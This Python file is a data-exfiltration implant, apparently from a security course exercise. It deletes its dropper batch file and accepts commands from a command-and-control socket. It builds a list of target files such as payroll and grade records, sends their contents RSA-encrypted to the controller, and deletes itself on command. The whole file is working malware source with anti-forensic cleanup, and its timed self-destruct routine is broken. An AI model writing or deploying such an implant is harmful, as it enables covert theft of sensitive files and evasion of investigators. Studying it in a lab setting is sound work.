import os
from os import remove
from sys import argv
import requests
import socket
import sys
import rsa
import time

print("Implant Running")

#Remove evidence of script.bat from the start
try:
    os.remove("script.bat")
except:
    print("Batch file already gone")

#Add the paths to paths.txt
with open('Paths.txt', 'w') as f:
    f.write('C:\\Users\\CS590J\\Desktop\\Teacher Files\\Payroll.txt\n')
    f.write('C:\\Users\\CS590J\\Desktop\\Student Files\\Grades.txt\n')
    f.close()

#function returns the command recieved by the victim implant listener
def recieve_command():
    connection, client_address = implant_socket.accept()
    try:
        #Recieves and prints the data
        while True:
            data = connection.recv(1500)
            if data:
                return(data)
            
    finally:
        # Clean up the connection
        print("Connection Closed")
        connection.close()

#function sends data passed to it to the c2
def send_exfil(data):
    try:
        # Send data
        print('sending:', data)
        c2_socket.sendall(data)
    
    except:
        print("Error")

def self_destruct():
    remove(argv[0])
    sys.exit()

def check_time(start_time):
    if(start_time == 0):
        start_time = round(time.time() * 1000)
    cur_millis = round(time.time() * 1000)
    #delete after 10 hr running
    if(cur_millis - start_time > 36000000):
        self_destruct



# Create a TCP/IP socket for the victim implant
implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the socket to the port and listen
implant_server_address = ('localhost', 10000)
implant_socket.bind(implant_server_address)
implant_socket.listen(1)

start_time = 0
while(True):
    #dead man's switch
    check_time(start_time)
    
    command = recieve_command().decode("utf-8")
    print("Recieved Command: ", command)
    comm = command.split(";")[0]

    #append to paths
    if(comm == "2a"):
        param = command.split(";")[1]
        file1 = open('Paths.txt', 'r')
        Lines = file1.readlines()
        file1.close()
        with open('Paths.txt', 'w') as f:
            for line in Lines:
                f.write(line)
            f.write(param + "\n")
            f.close()

    #exfil paths
    if(comm == "2e"):
        file1 = open('Paths.txt', 'r')
        Lines = file1.readlines()
        file1.close()

        # Create a TCP/IP socket
        c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        c2_server_address = ('localhost', 9999)
        print("Connecting to Socket")
        c2_socket.connect(c2_server_address)

        #rsa key
        n = int(command.split(";")[1])
        e = int(command.split(";")[2])
        pubkey = rsa.PublicKey(n,e)
        print(pubkey)
        
        for line in Lines:
            #exfil the file for each location in Lines
            cur_file = open(line.replace("\n", ""), 'r')
            cur_file_lines = cur_file.readlines()
            #encrypt the content before sending it back
            file_title = "------" + line.replace("\n", "") + "------\n"
            enc = rsa.encrypt(file_title.encode('utf8'), pubkey)
            send_exfil(enc)
            for c in cur_file_lines:
                #encrypt the content before sending it back
                enc = rsa.encrypt(c.encode('utf8'), pubkey)
                send_exfil(enc)
                time.sleep(1)
            cur_file.close()
            
        #attempt to close socket
        try:
            print("Closing Socket")
            c2_socket.close()
        
        #in case of error
        except:
            print("error")

    if(comm == "1"):
        #self destruct
        self_destruct()
        
